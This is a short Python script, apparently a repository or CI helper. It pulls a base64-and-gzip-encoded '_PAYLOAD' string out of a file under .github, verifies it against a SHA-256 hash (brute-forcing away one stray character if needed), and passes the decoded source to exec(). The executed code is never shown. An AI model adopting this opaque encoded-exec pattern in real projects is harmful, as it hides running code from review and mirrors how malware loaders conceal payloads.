from __future__ import annotations

import ast
import base64
import gzip
import hashlib
from pathlib import Path

SOURCE = Path('.github/wp08-attempt5-dependency-authority-fix.py')
EXPECTED_SHA256 = 'b6865257956e7d7bd0e5208439538f9150ea219f3c582fbe7701cdd33f940cef'
EXPECTED_B64_LENGTH = 13960


def payload_from_source() -> str:
    tree = ast.parse(SOURCE.read_text(encoding='utf-8'))
    for node in tree.body:
        if isinstance(node, ast.Assign):
            if any(isinstance(target, ast.Name) and target.id == '_PAYLOAD' for target in node.targets):
                value = ast.literal_eval(node.value)
                if isinstance(value, str):
                    return value
    raise SystemExit('temporary patch payload not found')


def decode_if_exact(value: str) -> str | None:
    try:
        raw = gzip.decompress(base64.b64decode(value, validate=True))
    except Exception:
        return None
    if hashlib.sha256(raw).hexdigest() != EXPECTED_SHA256:
        return None
    return raw.decode('utf-8')


payload = payload_from_source()
source = decode_if_exact(payload)
if source is None:
    if len(payload) != EXPECTED_B64_LENGTH + 1:
        raise SystemExit(f'unexpected temporary payload length: {len(payload)}')
    for index in range(len(payload)):
        candidate = payload[:index] + payload[index + 1:]
        source = decode_if_exact(candidate)
        if source is not None:
            print(f'recovered checksum-verified patch payload by removing transport character at index {index}')
            break
if source is None:
    raise SystemExit('unable to recover checksum-verified Attempt 5 patch payload')

exec(compile(source, 'wp08-attempt5-dependency-authority-fix', 'exec'))
